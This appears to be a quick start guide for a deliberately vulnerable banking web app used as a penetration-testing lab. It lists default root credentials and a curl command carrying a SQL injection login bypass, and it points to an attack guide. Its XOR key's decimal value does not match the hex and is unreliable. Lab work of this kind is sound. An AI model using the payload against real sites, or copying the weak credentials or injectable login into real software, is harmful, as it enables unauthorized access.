# vBank - Quick Start Guide

## Setup (2 minutes)

```bash
cd /home/passwd/bank_app
chmod +x setup.sh
./setup.sh
```

## Access

| Component | URL | User | Password |
|-----------|-----|------|----------|
| Application | http://localhost/ | alex | 413Xp455 |
| phpMyAdmin | http://localhost:8081/ | root | aaa |
| MySQL | localhost:3306 | root | aaa |

## Test Authentication Bypass (Verify Vulnerabilities Work)

```bash
# SQL Injection - Bypass Login
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Access Protected Page
curl -b cookies.txt "http://localhost/index.php?page=htbmain"
```

## Next Steps

- **Detailed Attacks**: See [PENETRATION_TESTING_GUIDE.md](PENETRATION_TESTING_GUIDE.md)
- **Live Testing**: Use Burp Suite or curl with techniques in the guide
- **Database**: Access phpMyAdmin at http://localhost:8081/ to verify changes

## Key Credentials

```
XOR Key: 0x0BADC0DE (3735928830)
Account 11111111 → XOR encoded: 252170513
Account 22222222 → XOR encoded: 243688756
Account 33333333 → XOR encoded: 235207009
```

---

**Ready to start?** Open [PENETRATION_TESTING_GUIDE.md](PENETRATION_TESTING_GUIDE.md) for verified attack vectors!
